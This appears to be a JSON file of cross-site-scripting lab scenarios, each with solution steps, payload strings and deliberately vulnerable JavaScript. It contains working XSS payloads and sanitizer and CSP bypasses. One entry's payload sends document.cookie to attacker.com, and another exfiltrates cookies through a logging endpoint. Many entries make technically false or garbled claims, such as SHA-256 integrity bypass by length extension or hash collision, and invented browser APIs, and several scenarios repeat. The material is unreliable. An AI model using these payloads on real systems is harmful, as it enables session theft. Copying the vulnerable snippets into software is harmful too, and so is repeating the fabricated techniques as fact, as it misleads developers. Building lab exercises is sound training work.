[
  {
    "Lab scenario": "XSS in WebAssembly Component Model Type Reflection",
    "Lab Description": "Plugin system uses WASM components with unsafe interface type reflection. The application renders component exports via innerHTML during debugging. To solve: Inject HTML through malformed UTF-8 in component adapter strings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile malicious component with wasm-tools",
      "Craft payload: (adapter utf8 \"\\x3Cscript>alert(1)</script>\")",
      "Bypass UTF-8 validation using overlong encoding",
      "Chain with shared-everything linking model",
      "Verify via component registry dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(component (export \"\\uD83D\\uDC4D<script>\" (func)))",
      "data:application/wasm-component;base64,CmFkYXB0ZXIg..."
    ],
    "srcCode": "const component = await WebAssembly.compileComponent(userUpload);\ndebugUI.innerHTML = JSON.stringify(component.exports);"
  },
  {
    "Lab scenario": "CSS Masonry Layout XSS in Design Portfolio",
    "Lab Description": "Portfolio builder implements CSS masonry layouts with unsafe grid-template-area names. The application reflects user input in CSSOM via insertRule(). To solve: Break layout context through area name injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify masonry container via DevTools",
      "Craft payload: grid-template-areas: \"</style><svg/onload=alert(1)>\"",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @supports selector() fallback",
      "Verify through PDF export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "grid-template-areas: \"\\3C script\\3E alert(1) \\3C /script\\3E\"",
      "@container (width: </style><script>alert(1)</script>)"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`.gallery { ${userInput} }`);"
  },
  {
    "Lab scenario": "Web Serial API XSS in Industrial Control System",
    "Lab Description": "SCADA interface processes serial port data with unsafe TextDecoderStream handling. The application renders device output via innerText with CSS unescape. To solve: Spoof serial devices with payloads in handshake messages.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Program Arduino to send malicious serial data",
      "Craft payload: \"BAUDRATE: 9600\\n<script>alert(1)</script>\\n\"",
      "Bypass input validation using flow control",
      "Automate with Web Serial polyfill",
      "Verify through HMI dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "serialPort.writable.getWriter().write(new TextEncoder().encode('</script><svg onload=alert(1)>'))",
      "{\"vendorId\":1337,\"productId\":7331,\"serialNumber\":\"<iframe/src=javascript:alert(1)>\"}"
    ],
    "srcCode": "const reader = port.readable.getReader();\nreader.read().then(({value}) => {\n  statusDiv.innerText += new TextDecoder().decode(value); // Vulnerable unescape"
  },
  {
    "Lab scenario": "Import Maps Integrity Bypass in Micro-Frontend Host",
    "Lab Description": "Cloud platform dynamically constructs import maps from URL parameters with lax integrity checks. To solve: Hijack module resolution via hash collision attacks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import map request via MitM",
      "Craft payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
      "Bypass SRI using length extension attacks",
      "Automate with Playwright interception",
      "Verify through dependency graph"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script type=\"importmap\">{\"imports\":{\"@core/\":\"javascript:alert(1)\"}}</script>",
      "import('data:text/javascript,alert(document.domain)')"
    ],
    "srcCode": "app.get('/config', (req, res) => {\n  res.json(JSON.parse(req.query.imports)); // Vulnerable"
  },
  {
    "Lab scenario": "SVG Font Loading XSS in E-Learning Platform",
    "Lab Description": "Courseware renders SVG fonts with unsafe <hkern> element parsing. The application uses DOMPurify 3.0.0 with whitelisted font tags. To solve: Inject XSS through glyph kerning pair overflows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious SVG font using FontForge",
      "Craft payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
      "Bypass MIME validation via polyglot SVG/ZIP",
      "Chain with CSS font-palette",
      "Verify through course certificate generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
      "@font-face { src: url('data:image/svg+xml,<svg>...</svg>') }"
    ],
    "srcCode": "courseRenderer.loadFont(userFont).then(() => {\n  viewerDiv.innerHTML = courseContent; // Vulnerable\n});"
  },
  {
    "Lab scenario": "DOM-based XSS in Healthcare Portal PDF Generator",
    "Lab Description": "Patient record system generates PDFs using untrusted input in client-side HTML-to-PDF conversion. The application injects user-controlled data into PDF templates without sanitization. To solve: Execute JavaScript when viewing PDFs in vulnerable browsers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept PDF request with Burp Suite",
      "Validate with OWASP ZAP: <img%20src=x%20onerror=console.log(origin)>",
      "Craft SVG payload: <svg/onload=alert(document.cookie)>",
      "Bypass CSP using UTF-16BE encoding",
      "Verify via Chrome PDF viewer"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg/onload=\"javascript:alert(document.domain)\">",
      "<link rel=stylesheet href='data:text/css,*{background-image:url(\"javascript:alert(1)\")}'>"
    ],
    "srcCode": "app.post('/generate-pdf', (req, res) => {\n  const html = `<html>${req.body.userContent}</html>`;\n  pdf.create(html).toStream((err, stream) => {});\n});"
  },
  {
    "Lab scenario": "Stored XSS in IoT Device Management Console",
    "Lab Description": "Smart home dashboard stores device names in MongoDB with dangerous AngularJS sandbox escape. The application renders names via innerHTML. To solve: Achieve persistent XSS using prototype pollution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send PUT /api/devices with Postman",
      "Craft payload: {{constructor.constructor('alert(1)')()}}",
      "Bypass WAF using UTF-7 encoding",
      "Automate with Python requests",
      "Verify across user sessions"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}",
      "<script>throw {message:'x', source:alert}</script>"
    ],
    "srcCode": "app.post('/devices', (req, res) => {\n  const device = new Device({ name: req.body.name });\n  device.save();\n  res.send(`<div id=\"device-name\">${device.name}</div>`);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in CMS Markdown Processor",
    "Lab Description": "Blog platform processes Markdown with dangerous DOMPurify 2.4.0 configuration allowing SVG foreignObject. To solve: Achieve XSS via parser differentials in sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Publish article with payload via UI",
      "Craft: <svg><foreignObject><body><img src=x onerror=alert(1)>",
      "Bypass CSP using data: URI in <use>",
      "Test across Firefox/Chrome",
      "Verify through RSS feed"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg><animate attributeName='href' values='javascript:alert(1)'/>",
      "<math><mtext><option><style><img src=x onerror=alert(1)></style>"
    ],
    "srcCode": "app.post('/articles', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.content);\n  Article.create({ content: sanitized });\n});"
  },
  {
    "Lab scenario": "Blind XSS in API Gateway Error Logging",
    "Lab Description": "Microservice API logs User-Agent headers verbatim in ELK Stack. To solve: Achieve delayed XSS in Kibana Discover tab through HTTP header injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify header reflection with curl -H",
      "Craft payload: \"><script>fetch(`https://attacker.com?${document.cookie}`)</script>",
      "Bypass header sanitization using HTTP obs-fold",
      "Automate with Go http.Client",
      "Monitor attacker server"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "User-Agent: javascript:/*--></title></style></script><svg/onload='alert(1)'>",
      "Accept-Language: \" onfocus=alert(1) autofocus=\""
    ],
    "srcCode": "app.use((req, res, next) => {\n  logger.info(`User-Agent: ${req.headers['user-agent']}`);\n  next();\n});"
  },
  {
    "Lab scenario": "Reflected XSS in Chat Application WebSocket Messages",
    "Lab Description": "Real-time chat app processes WebSocket messages with direct DOM injection. To solve: Trigger XSS via malformed message chunks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket handshake with Burp",
      "Craft: <iframe srcdoc=\"<script>parent.alert(1)</script>\">",
      "Bypass message size limits via fragmentation",
      "Combine with CSRF using ws://",
      "Verify in collaborative chat"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "ws.send(JSON.stringify({msg: \"<img/src=x onerror=alert(1)>\"}))",
      "%3Cscript%3Ealert(document.domain)%3C/script%3E"
    ],
    "srcCode": "wss.on('connection', (ws) => {\n  ws.on('message', (msg) => {\n    document.getElementById('chat').innerHTML += msg;\n  });\n});"
  },
  {
    "Lab scenario": "DOM-based XSS via WebAssembly SharedArrayBuffer Corruption",
    "Lab Description": "Financial trading platform uses WebAssembly with SharedArrayBuffer for real-time calculations. The application reflects memory contents in debug UI via innerHTML. To solve: Corrupt shared memory to inject HTML payloads through atomic operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze memory with Chrome DevTools Memory tab",
      "Craft payload: Atomics.store(memory, 0, 0x3C736372) <!-- Hex for <scr -->",
      "Bypass COOP/COEP restrictions using subresource tricks",
      "Chain with Worker.postMessage() timing attacks",
      "Verify through trading console debug overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new SharedArrayBuffer(1024).set([...'<script>alert(1)</script>'])",
      "wasmMemory.grow(256);\nnew Uint8Array(wasmMemory.buffer).set([60,115,99])"
    ],
    "srcCode": "const memory = new WebAssembly.Memory({ shared: true, initial: 1 });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(memory.buffer);"
  },
  {
    "Lab scenario": "Stored XSS in CSS @layer Rule Processing",
    "Lab Description": "Design system builder implements @layer rules with unsafe dynamic style injection. The application allows user-controlled layer names via template literals. To solve: Break style context through layer name injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify layer usage via Computed Styles",
      "Craft payload: @layer </style><script>alert(1)</script>",
      "Bypass sanitizer using CSS escape sequences",
      "Chain with @supports selector() fallbacks",
      "Verify through design token export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@layer \\3C script\\3E { :root { --x: 'alert(1)' } }",
      "@layer x[href^='javascript:'] { color: red; }"
    ],
    "srcCode": "const styles = `@layer ${userInput} { /* ... */ }`;\ndocument.adoptedStyleSheets.push(new CSSStyleSheet().replace(styles));"
  },
  {
    "Lab scenario": "WebTransport Stream Hijacking in Multiplayer Game Lobby",
    "Lab Description": "Browser-based game uses WebTransport for real-time sync with unsafe stream processing. The application concatenates message chunks via innerHTML. To solve: Inject XSS through fragmented stream payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport session via Wireshark",
      "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
      "Bypass message validation using QUIC stream resets",
      "Automate with webtransport-py client",
      "Verify through in-game chat display"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "quic.SendStream([]byte{'<','s','c','r','i','p','t','>'})",
      "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "const reader = transport.incomingStreams.getReader();\nreader.read().then(({value}) => {\n  gameUI.innerHTML += new TextDecoder().decode(value);\n});"
  },
  {
    "Lab scenario": "WebAuthn Credential ID XSS in Enterprise SSO",
    "Lab Description": "Single sign-on system stores WebAuthn credential IDs without sanitization. The application reflects credential metadata in admin panel via innerHTML. To solve: Inject HTML through crafted attestationObject extensions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Forge authenticator using FIDO2 emulator",
      "Craft payload: {1: {2: \"<script>alert(1)</script>\"}} in CBOR extensions",
      "Bypass base64url validation using non-UTF8 bytes",
      "Automate with Python fido2 library",
      "Verify through admin audit logs"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "authData: new Uint8Array([...'<script>alert(1)</script>'])",
      "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0="
    ],
    "srcCode": "app.post('/webauthn', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  adminUI.innerHTML += credential.id; // Vulnerable\n});"
  },
  {
    "Lab scenario": "Mutation XSS in SVG Font Kerning Parsing",
    "Lab Description": "E-learning platform processes SVG fonts with unsafe <hkern> element handling. The application uses DOMPurify 3.0.0 with broken foreignObject sanitization. To solve: Achieve XSS through glyph kerning pair injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload malicious SVG font via CMS",
      "Craft payload: <hkern g1=\"</font><script>alert(1)</script>\" g2=\"x\"/>",
      "Bypass MIME checks using font/woff2 polyglot",
      "Chain with CSS font-feature-settings",
      "Verify through course certificate PDF"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<font><hkern g1=\"\\3C script\\3E\" g2=\"alert(1)\"/>",
      "@font-face { src: url('data:image/svg+xml,<svg>...</svg>') }"
    ],
    "srcCode": "app.post('/upload-font', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.font);\n  fs.writeFileSync(`fonts/${Date.now()}.svg`, sanitized);\n});"
  },
  {
    "Lab scenario": "DOM-based XSS via WebGPU Storage Buffer Corruption",
    "Lab Description": "3D modeling tool maps GPU storage buffers to debug UI with unsafe memory reflection. The application visualizes WebGPU memory via innerHTML without validation. To solve: Corrupt buffer data to inject HTML through fp16 precision abuse.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze buffer bind groups via WebGPU Inspector",
      "Craft payload: textureStore(tex, vec2<i32>(), vec4<f32>(0.000060, 0.000115, ...)) <!-- ASCII <script> -->",
      "Bypass format validation using texture view aliasing",
      "Chain with indirect dispatch race conditions",
      "Verify through wireframe debug overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "dispatchWorkgroupsIndirect(/* buffer with 0x3C736372 payload */)",
      "textureStore(tex, vec2<i32>(), vec4<f32>(0.000060, 0.000115, 0.000099, 0.000062))"
    ],
    "srcCode": "const texture = device.createTexture({ format: 'rgba16float', usage: GPUTextureUsage.STORAGE });\ndocument.getElementById('debug').innerHTML = \n  new TextDecoder().decode(texture.read());"
  },
  {
    "Lab scenario": "Stored XSS in CSS Animation Timeline",
    "Lab Description": "Interactive timeline tool implements scroll-driven animations with unsafe timeline-name handling. The application allows user-controlled animation-timeline names via CSSOM. To solve: Break style context through timeline identifier injection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify timeline binding via Chrome Animations panel",
      "Craft payload: animation-timeline: --</style><script>alert(1)</script>",
      "Bypass sanitizer using CSS Unicode escapes",
      "Chain with @scroll-timeline polyfill",
      "Verify through PDF timeline export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@keyframes x { timeline-scope: \\3C script\\3E }",
      "animation: x linear; animation-timeline: --\\3C script\\3E"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`@scroll-timeline ${userInput} { ... }`);\ndocument.adoptedStyleSheets.push(sheet);"
  },
  {
    "Lab scenario": "WebHID Barcode Scanner XSS in Retail Analytics",
    "Lab Description": "POS system processes USB-HID barcode data with unsafe input handling. The application renders product codes via innerText with CSS unescape. To solve: Spoof barcode scanners with malicious PLU codes in HID reports.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Program Teensy 4.1 as virtual HID device",
      "Craft payload: ReportData: [0x3C, 0x73, 0x63, 0x72] <!-- ASCII <scr -->",
      "Bypass validation using vendor-specific usage pages",
      "Automate with WebHID report listener",
      "Verify through real-time sales dashboard"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"vendorId\":0x1234,\"productId\":0x5678,\"reportData\":[60,115,99,114,105,112,116,62]}",
      "inputReport: new Uint8Array([0x3C,0x73,0x63,0x72,0x69,0x70,0x74,0x3E])"
    ],
    "srcCode": "device.addEventListener('inputreport', e => {\n  salesDisplay.innerText += new TextDecoder().decode(e.data.buffer); // Vulnerable CSS unescape\n});"
  },
  {
    "Lab scenario": "Mutation XSS in SVG Filter Primitive",
    "Lab Description": "Analytics dashboard implements SVG feDisplacementMap with unsafe scale handling. The application allows user-controlled filter scales via attribute binding. To solve: Inject XSS through filter primitive parameter overflows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify filter application via Elements panel",
      "Craft payload: <feFuncR type='table' tableValues='</text><script>alert(1)</script>'/>",
      "Bypass CSP using filter composition",
      "Chain with <animate> timing attacks",
      "Verify through data visualization export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<filter id='x'><feComponentTransfer><feFuncR type='table' tableValues='</script><svg/onload=alert(1)>'/></filter>",
      "<feImage href='data:text/html,<script>alert(1)</script>'/>"
    ],
    "srcCode": "const svg = `<svg>${userFilters}</svg>`;\ndocument.body.insertAdjacentHTML('beforeend', svg); // Vulnerable"
  },
  {
    "Lab scenario": "Import Maps Hash Collision XSS in Micro-Frontend",
    "Lab Description": "Enterprise dashboard dynamically loads modules using import maps with weak integrity checks. To solve: Hijack module resolution via crafted SRI hash collisions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept import map request via Charles Proxy",
      "Craft payload: {\"imports\":{\"@core/\":\"data:text/javascript,alert(1)\"}}",
      "Bypass SHA-256 integrity using length extension",
      "Automate with Playwright request interception",
      "Verify through admin panel initialization"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<script type=\"importmap\" integrity=\"sha256-...\">{\"imports\":{\"react\":\"javascript:alert(1)\"}}</script>",
      "import('data:text/javascript;base64,YWxlcnQoMSk=')"
    ],
    "srcCode": "app.get('/config', (req, res) => {\n  res.json({ imports: JSON.parse(req.query.modules) }); // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebCodecs VideoFrame Metadata XSS in Telemedicine Platform",
    "Lab Description": "Patient video analysis tool processes WebCodecs VideoFrames with unsafe metadata extraction. The application injects user-controlled metadata into debug overlays via innerHTML. To solve: Achieve XSS through crafted video rotation metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept video stream via FFmpeg",
      "Inject payload: videoFrame.rotation = '><svg/onload=alert(1)>",
      "Bypass CSP using orientation validation quirks",
      "Chain with WebGL texture sampling",
      "Verify through DICOM viewer overlay"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "videoFrame.copyTo(new Uint8Array([...'<script>alert(1)</script>']))",
      "/* xmpMM:InstanceID */ '></dc:title><script>alert(1)</script>'"
    ],
    "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    overlayDiv.innerHTML += `Rotation: ${frame.rotation}`;\n  }\n});"
  },
  {
    "Lab scenario": "CSS Font Tech XSS in Digital Publishing",
    "Lab Description": "E-book reader implements variable fonts with unsafe axis handling. The application allows user-controlled font-variation-settings via CSSOM. To solve: Inject XSS through font tech parameter overflows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious variable font with FontForge",
      "Craft payload: font-variation-settings: \"</style><script>alert(1)</script>\" 1",
      "Bypass axis validation using fractional values",
      "Chain with @font-palette-values",
      "Verify through EPUB rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "@font-face { font-family:x; src:url('data:font/woff2;base64,...') }",
      "font-variation-settings: \"\\3C script\\3E\" 1"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userFontRules} }`);"
  },
  {
    "Lab scenario": "WebTransport Bidirectional Stream XSS in Autonomous Drone Control",
    "Lab Description": "Drone fleet management uses WebTransport bidirectional streams for telemetry with unsafe message concatenation. To solve: Inject fragmented XSS payloads through stream chunk manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebTransport session via Wireshark",
      "Craft payload: writer.write(new TextEncoder().encode('</script><iframe/src=javascript:alert(1)>'))",
      "Bypass MTU limits using DATAGRAM frame fragmentation",
      "Automate with webtransport-go",
      "Verify through 3D flight path UI"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "quic.SendStream([]byte{'<','s','c','r','i','p','t','>'})",
      "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    "srcCode": "const stream = await transport.createBidirectionalStream();\nstream.readable.pipeTo(new WritableStream({\n  write(chunk) { controlUI.innerHTML += new TextDecoder().decode(chunk); }\n}));"
  },
  {
    "Lab scenario": "ARIA 2.0 Role Clobbering in Accessibility Dashboard",
    "Lab Description": "WCAG compliance tool implements ARIA 2.0 roles with dangerous aria-colcount reflection. The application uses setAttribute('aria-colcount') with raw user input. To solve: Abuse aria-colcount to escape DOM sanitization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify ARIA 2.0 support via a11y tree",
      "Craft payload: <table aria-colcount=\"</table><script>alert(1)</script>\">",
      "Bypass sanitizer using aria-atomic=\"true\"",
      "Chain with shadow DOM slot distribution",
      "Verify through automated audits"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<div role='grid' aria-colcount='<iframe/src=javascript:alert(1)>'></div>",
      "<span role='math' aria-describedat='x'><template id='x' shadowroot=open><script>alert(1)</script>"
    ],
    "srcCode": "element.setAttribute('aria-colcount', userInput);\nauditLog.innerHTML = element.outerHTML; // Vulnerable"
  },
  {
    "Lab scenario": "WebAssembly Exception XSS in Blockchain Debugger",
    "Lab Description": "Smart contract IDE handles WebAssembly exceptions with unsafe error message rendering. The application displays exception tags via innerHTML without validation. To solve: Inject HTML through malformed exception tag IDs.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile WASM with custom exception tags",
      "Craft payload: (exception $XSS (param i32) (i32.const 0x3C736372))",
      "Bypass tag validation using multi-memory proposals",
      "Chain with garbage collection hooks",
      "Verify via debug console"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "throw new WebAssembly.Exception($XSS, [0x3C736372])",
      "catch ($XSS => String.fromCharCode(...args))"
    ],
    "srcCode": "try { instance.exports.execute(); } catch (e) {\n  debuggerUI.innerHTML = e; // Vulnerable\n}"
  },
  {
    "Lab scenario": "DOM-based XSS in Banking Portal PDF Generator",
    "Lab Description": "The banking portal's PDF statement generator reflects URL parameters without proper DOM sanitization. The application directly embeds user-controlled data into PDF-rendering JavaScript. To solve: Exploit the DOM manipulation to execute arbitrary JavaScript when generating a PDF statement.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept PDF generation request",
      "Identify vulnerable 'transactionId' parameter in URL",
      "Craft payload: javascript:alert(document.cookie)//#<xss id=x onfocus=alert(1) tabindex=1>",
      "Modify HTTP headers to force PDF rendering as HTML",
      "Verify execution through PDF preview functionality"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
      "javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))",
      "<svg/onload=alert(document.domain)>"
    ],
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/generate-pdf', (req, res) => {\n  const userInput = decodeURIComponent(req.query.transactionId);\n  res.send(`<script>\n    PDFObject.embed(\"/api/pdf?data=${userInput}\");\n  </script>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in IoT Dashboard Device Naming",
    "Lab Description": "An industrial IoT management system fails to sanitize device names stored in its NoSQL database. The application renders device names in multiple dashboard views using innerHTML. To solve: Create a malicious device entry that triggers an alert when any user views the device list.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send crafted POST /api/devices request",
      "Bypass client-side validation using Unicode encoding",
      "Inject payload: <img src=x onerror=\"fetch('/log?exfil='+btoa(document.cookie))\">",
      "Exploit MongoDB operator to store payload in multiple fields",
      "Verify through dashboard's device grouping feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "d={\"$set\":{\"name\":\"<img src=x onerror=alert(1)>\"}}",
      "{\"name\": {\"$gt\": \"\"}, \"name\": \"<script>alert(1)</script>\"}"
    ],
    "srcCode": "app.post('/api/devices', (req, res) => {\n  db.collection('devices').updateOne(\n    { userId: req.user.id },\n    { $set: { name: req.body.name } },\n    { upsert: true }\n  );\n  res.status(201).send('Device created');\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Chat Application Message Rendering",
    "Lab Description": "A real-time chat application's message sanitizer fails to handle SVG namespace mutations. The application uses innerHTML with custom sanitization rules. To solve: Craft a message that bypasses the sanitizer and executes JavaScript when viewed in modern browsers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket message using OWASP ZAP",
      "Construct polyglot payload combining HTML/SVG/XML namespaces",
      "Use mutation trigger: <svg><style>@keyframes x{}</style><svg style=\"animation-name:x\" onanimationstart=\"alert(1)\">",
      "Bypass CSP using strict-dynamic in existing script imports",
      "Verify execution through message history export feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<svg><animate attributeName=href values=javascript:alert(1) /><a href=?><circle r=400></animate>",
      "<img alt='<xmp><plaintext><img src=x onerror=alert(1)>"
    ],
    "srcCode": "function sanitize(input) {\n  return input.replace(/<script/gi, '')\n    .replace(/on\\w+=/gi, 'data-')\n    .replace(/javascript:/gi, '');\n}\n// Client-side rendering:\ndocument.getElementById('chat').innerHTML = sanitize(userMessage);"
  },
  {
    "Lab scenario": "Reflected XSS in API Gateway Error Handling",
    "Lab Description": "The REST-to-GraphQL translation layer reflects error messages without proper encoding. The application returns user-controlled parameters in JSON error responses rendered as HTML. To solve: Exploit the error rendering to trigger an XSS in the admin interface.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed GraphQL query via Postman",
      "Identify reflection point in 'invalidParameter' error field",
      "Craft Content-Type: text/html response override",
      "Inject payload: </script><svg onload=alert(document.domain)>",
      "Exploit via CSRF to admin panel error viewer"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"error\": \"Invalid parameter: '\\\"</script><svg/onload=alert(1)>\"}",
      "%22%3E%3Cscript%3Ealert(%22XSS%22)%3C/script%3E"
    ],
    "srcCode": "app.use('/graphql', (err, req, res, next) => {\n  res.status(400).json({\n    error: `Invalid parameter: '${req.query.q}'`\n  });\n});"
  },
  {
    "Lab scenario": "DOM XSS in Healthcare Portal WebSocket Handshake",
    "Lab Description": "A patient monitoring system's WebSocket initialization uses unsanitized URL parameters. The application processes handshake parameters through vulnerable client-side routing. To solve: Exploit the WebSocket connection process to execute privileged JavaScript in the EHR interface.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket upgrade request using Burp Suite",
      "Modify Sec-WebSocket-Protocol header with XSS payload",
      "Use AngularJS sandbox escape: {{constructor.constructor('alert(1)')()}}",
      "Bypass connection origin validation using null bytes",
      "Trigger payload through forced reconnection sequence"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Sec-WebSocket-Protocol: \",alert(document.domain)//",
      "ws://localhost:8080/?patientId=<img src=x onerror=alert(1)>"
    ],
    "srcCode": "const ws = new WebSocket(`wss://${window.location.host}/ws/${patientId}`);\ndocument.getElementById('status').innerHTML = `Connecting to ${patientId}`;"
  },
  {
    "Lab scenario": "Stored XSS in CMS WYSIWYG Editor via Markdown Rendering",
    "Lab Description": "A headless CMS converts Markdown to HTML using outdated parser with insecure anchor href handling. The application allows privileged users to create public knowledge base articles. To solve: Inject persistent XSS through markdown link syntax that executes in reader's browsers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP active scan to detect markdown processing endpoint",
      "Craft payload: [XSS](javascript:alert`${document.domain}`)",
      "Bypast href sanitization using UTF-7 encoding: [+]ADw-script+AD4-alert(1)+ADw-/script+AD4-",
      "Chain with iframe srcdoc attribute for multi-vector execution",
      "Verify through CMS's article revision history feature"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "[Click](j&#x41;v&#x61;script:alert(1))",
      "<a href=\"\\x0Bjavascript:alert(1)\">Test</a>"
    ],
    "srcCode": "function markdownToHtml(text) {\n  return text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, '<a href=\"$2\">$1</a>');\n}\n// Rendered as:\ndocument.getElementById('content').innerHTML = markdownToHtml(userInput);"
  },
  {
    "Lab scenario": "DOM XSS in Social Media Bio Field via Client-Side Template Literals",
    "Lab Description": "A new social platform renders user bios using unescaped template literals in Vue.js. The application processes user-supplied URLs through client-side routing. To solve: Exploit template interpolation to execute JavaScript in other users' profile views.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept profile update request with Burp Suite",
      "Identify vulnerable bio parameter accepting multiline input",
      "Inject payload: ${alert`${document.cookie}`}",
      "Bypass CSP using nonce reuse in existing analytics scripts",
      "Trigger through profile preview iframe with X-Frame-Options bypass"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "${[].find.call(document.body,'').constructor`alert(1)```}",
      "#{alert(1)}"
    ],
    "srcCode": "new Vue({\n  el: '#bio',\n  template: `<div>${userBio}</div>`\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Video Platform Subtitle Processing",
    "Lab Description": "A video sharing service's subtitle parser fails to handle HTML5 track element namespace mutations. The application converts SRT to VTT format client-side. To solve: Craft malicious subtitles that execute JavaScript when video reaches 00:01 timestamp.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload crafted .vtt file using Postman",
      "Construct payload: <video><source onerror=alert(1)>",
      "Exploit WebVTT region positioning to hide payload",
      "Bypass MIME type validation using double extensions",
      "Trigger through autoplay feature with seek parameter"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "WEBVTT\n\n00:00:01.000 --> 00:00:02.000\n<video><source onerror=\"alert(1)\">",
      "<ruby><rtc><script>alert(1)</script>"
    ],
